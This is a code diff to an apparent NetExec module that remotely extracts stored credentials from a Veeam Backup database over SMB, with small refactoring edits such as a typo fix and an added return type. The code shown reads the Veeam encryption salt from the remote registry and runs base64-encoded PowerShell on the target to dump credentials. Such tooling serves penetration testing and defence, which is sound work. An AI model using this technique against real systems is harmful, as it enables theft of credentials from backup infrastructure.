@@ -15,8 +15,6 @@ class NXCModule:
     name = "veeam"
     description = "Extracts credentials from local Veeam SQL Database"
     supported_protocols = ["smb"]
-    opsec_safe = True
-    multiple_hosts = True
 
     def __init__(self):
         with open(get_ps_script("veeam_dump_module/veeam_dump_mssql.ps1")) as psFile:
@@ -119,7 +117,7 @@ class NXCModule:
             credentials = self.executePsPostgreSql(connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName, salt)
             self.printCreds(context, credentials)
 
-    def get_salt(self, context, remoteOps, regHandle):
+    def get_salt(self, context, remoteOps, regHandle) -> str:
         try:
             keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data")["phkResult"]
             return rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "EncryptionSalt")[1].split("\x00")[:-1][0]
@@ -129,24 +127,25 @@ class NXCModule:
         except Exception as e:
             context.log.fail(f"UNEXPECTED ERROR: {e}")
             context.log.debug(traceback.format_exc())
+        return ""
 
     def executePsMssql(self, connection, SqlDatabase, SqlInstance, SqlServer, salt):
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlDatabase", SqlDatabase)
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlInstance", SqlInstance)
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_SqlServer", SqlServer)
         self.psScriptMssql = self.psScriptMssql.replace("REPLACE_ME_b64Salt", salt)
-        psScipt_b64 = b64encode(self.psScriptMssql.encode("UTF-16LE")).decode("utf-8")
+        psScript_b64 = b64encode(self.psScriptMssql.encode("UTF-16LE")).decode("utf-8")
 
-        return connection.execute(f"powershell.exe -e {psScipt_b64} -OutputFormat Text", True)
+        return connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)
 
     def executePsPostgreSql(self, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName, salt):
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_PostgreSqlExec", PostgreSqlExec)
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_PostgresUserForWindowsAuth", PostgresUserForWindowsAuth)
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_SqlDatabaseName", SqlDatabaseName)
         self.psScriptPostgresql = self.psScriptPostgresql.replace("REPLACE_ME_b64Salt", salt)
-        psScipt_b64 = b64encode(self.psScriptPostgresql.encode("UTF-16LE")).decode("utf-8")
+        psScript_b64 = b64encode(self.psScriptPostgresql.encode("UTF-16LE")).decode("utf-8")
 
-        return connection.execute(f"powershell.exe -e {psScipt_b64} -OutputFormat Text", True)
+        return connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)
 
     def printCreds(self, context, output):
         # Format output if returned in some XML Format
